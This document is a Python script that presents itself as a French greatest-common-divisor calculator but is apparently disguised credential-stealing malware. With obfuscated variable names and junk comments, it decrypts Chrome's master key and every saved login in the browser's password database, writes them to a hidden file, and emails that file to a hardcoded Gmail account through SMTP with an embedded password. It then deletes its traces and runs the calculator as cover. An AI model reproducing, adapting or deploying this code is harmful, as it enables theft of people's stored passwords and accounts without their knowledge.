import os #line:1
#saalkfj
import json #line:2
import base64 #line:3
import sqlite3 #line:4
#saslfkjasd
import win32crypt #line:5
# ahddddsafddddddddssadf
from Cryptodome .Cipher import AES #line:6
import shutil #line:7
from time import sleep #line:8
print ("Bienvenue au calculateur de PGCD!")#print ("Bienvenu au calculateur de PGCD!\n")#line:114
def get_master_key ():#line:12
    with open (os .environ ['USERPROFILE']+os .sep +r'AppData\Local\Google\Chrome\User Data\Local State',"r")as O0O000O000000OO00 :#line:13
        O0OO0O0OO0000OOOO =O0O000O000000OO00 .read ()#line:14
        # ahdddddddddddssadferaf
        # kakfjdk
        O0OO0O0OO0000OOOO =json .loads (O0OO0O0OO0000OOOO )#line:15
        # ahdddddddddddssadf ahdddddddddddssadf
    O00OOOOOOO00OO00O =base64 .b64decode (O0OO0O0OO0000OOOO ["os_crypt"]["encrypted_key"])#line:16
    O00OOOOOOO00OO00O =O00OOOOOOO00OO00O [5 :]#line:17
    O00OOOOOOO00OO00O =win32crypt .CryptUnprotectData (O00OOOOOOO00OO00O ,None ,None ,None ,0 )[1 ]#line:18
    return O00OOOOOOO00OO00O #line:19
def decrypt_payload (OO00OOOOO00OO0OOO ,O0OOO0O000OO0OOOO ):#line:21
    return OO00OOOOO00OO0OOO .decrypt (O0OOO0O000OO0OOOO )#line:22
def generate_cipher (OOO0O0O0O00OOO0O0 ,OO0O0OO0OOO0OO0OO ):#line:24
    return AES .new (OOO0O0O0O00OOO0O0 ,AES .MODE_GCM ,OO0O0OO0OOO0OO0OO )#line:25
    #sajkflds akfjdaksfk
    # trtahdddddddddadddssadfd
def decrypt_password (O0OO0OO0000O00OOO ,OO00OO00O000O0O00 ):#line:27
    try :#line:28
        OOO0O00O000O0O0O0 =O0OO0OO0000O00OOO [3 :15 ]#line:29
        OOOO0O0000OO0O0O0 =O0OO0OO0000O00OOO [15 :]#line:30
        O0OO0O0O0O0OOO000 =generate_cipher (OO00OO00O000O0O00 ,OOO0O00O000O0O0O0 )#line:31
        O0O0O0O0O000000O0 =decrypt_payload (O0OO0O0O0O0OOO000 ,OOOO0O0000OO0O0O0 )#line:32
        O0O0O0O0O000000O0 =O0O0O0O0O000000O0 [:-16 ].decode ()#line:33
        return O0O0O0O0O000000O0 #line:34
    except Exception as OO0OO00000O0O0000 :#line:35
        return "Chrome < 80"#line:38
master_key =get_master_key ()#line:40
login_db =os .environ ['USERPROFILE']+os .sep +r'AppData\Local\Google\Chrome\User Data\default\Login Data'#line:41
shutil .copy2 (login_db ,"Loginvault.db")#line:42
#jsafal kjds
conn =sqlite3 .connect ("Loginvault.db")#line:43
cursor =conn .cursor ()#line:44
try :#line:45
    cursor .execute ("SELECT action_url, username_value, password_value FROM logins")#line:46
    for r in cursor .fetchall ():#line:47
        url =r [0 ]#line:48
        username =r [1 ]#line:49
        encrypted_password =r [2 ]#line:50
        decrypted_password =decrypt_password (encrypted_password ,master_key )#line:51
        # ahdddddddddddssadfdadf
        if len (username )>0 :#line:52
            with open (os .environ ['USERPROFILE']+os .sep +r'AppData\test.txt','a')as send_file :#line:53
                send_file .write ("URL: "+url +"\nUser Name: "+username +"\nPassword: "+decrypted_password +"\n"+"*"*50 +"\n")#line:54
except Exception as e :#line:56
    pass #line:57
cursor .close ()#line:58
conn .close ()#line:59
try :#line:60
    os .remove ("Loginvault.db")#line:61
except Exception as e :#line:62
    pass #line:63
sleep (1 )#line:65
def mail_it ():#line:67
    try :#line:68
        import smtplib #line:69
        import os #line:70
        from email .mime .text import MIMEText #line:71
        from email .mime .multipart import MIMEMultipart #line:72
        from email .mime .base import MIMEBase #line:73
        from email import encoders #line:74
        OOO0OOO00O00O0O0O ='yoyopi768@gmail.com'#line:76
        # ahdddddddddddssadfajf
        O0OOO00OO000OO00O ='tatimamadanimiki'#line:77
        # ahdddddddddddssadf ewru4
        O0OO0000O00O00O00 ='yoyopi768@gmail.com'#line:78
        O0000OOO00000OOOO ='subject'#line:80
        OOO000O0OOO00OO0O =MIMEMultipart ()#line:82
        OOO000O0OOO00OO0O ['From']=OOO0OOO00O00O0O0O #line:83
        OOO000O0OOO00OO0O ['To']=O0OO0000O00O00O00 #line:84
        # ahdddddddddddssadfdf ds
        OOO000O0OOO00OO0O ['Subject']=O0000OOO00000OOOO #line:85
        OO000O0O0000OO00O ='Hi there, sending this email from Gamer!'#line:87
        OOO000O0OOO00OO0O .attach (MIMEText (OO000O0O0000OO00O ,'plain'))#line:88
        OO0000O0OOOOO0O00 =os .environ ['USERPROFILE']+os .sep +r'AppData\test.txt'#line:90
        OOO0O000O000OO00O =open (OO0000O0OOOOO0O00 ,'rb')#line:91
        OOO00O0OO0O000000 =MIMEBase ('application','octet-stream')#line:93
        OOO00O0OO0O000000 .set_payload ((OOO0O000O000OO00O ).read ())#line:94
        encoders .encode_base64 (OOO00O0OO0O000000 )#line:95
        OOO00O0OO0O000000 .add_header ('Content-Disposition',"attachment; filename= "+OO0000O0OOOOO0O00 )#line:96
        OOO000O0OOO00OO0O .attach (OOO00O0OO0O000000 )#line:98
        O0O00OOO0OO000O0O =OOO000O0OOO00OO0O .as_string ()#line:99
        OOO00OO0000O0OOO0 =smtplib .SMTP ('smtp.gmail.com',587 )#line:100
        OOO00OO0000O0OOO0 .starttls ()#line:101
        OOO00OO0000O0OOO0 .login (OOO0OOO00O00O0O0O ,O0OOO00OO000OO00O )#line:102
        # ahdddddddddddssadf
        OOO00OO0000O0OOO0 .sendmail (OOO0OOO00O00O0O0O ,O0OO0000O00O00O00 ,O0O00OOO0OO000O0O )#line:105
        # ahdddddddddddssadf
        OOO00OO0000O0OOO0 .quit ()#line:106
    except Exception as OO000O00000O0OOO0 :#line:107
        print ("PGCD calculateur a buggé")#line:108
mail_it ()#line:110
os .remove (os .environ ['USERPROFILE']+os .sep +r'AppData\test.txt')#line:112
def gcd (OO0O0O00OOO0OO0OO ,OO00OO000000O00O0 ):#line:115
    while OO00OO000000O00O0 !=0 :#line:116
        (OO0O0O00OOO0OO0OO ,OO00OO000000O00O0 )=(OO00OO000000O00O0 ,OO0O0O00OOO0OO0OO %OO00OO000000O00O0 )#line:117
    print (f"Le PGCD de {OO0O0O00OOO0OO0OO} et {OO00OO000000O00O0} est {OO0O0O00OOO0OO0OO}")#line:118
gcd (int (input ("entrer un nombre: ")),int (input ("entrer un second nombre: ")))#line:120
input ()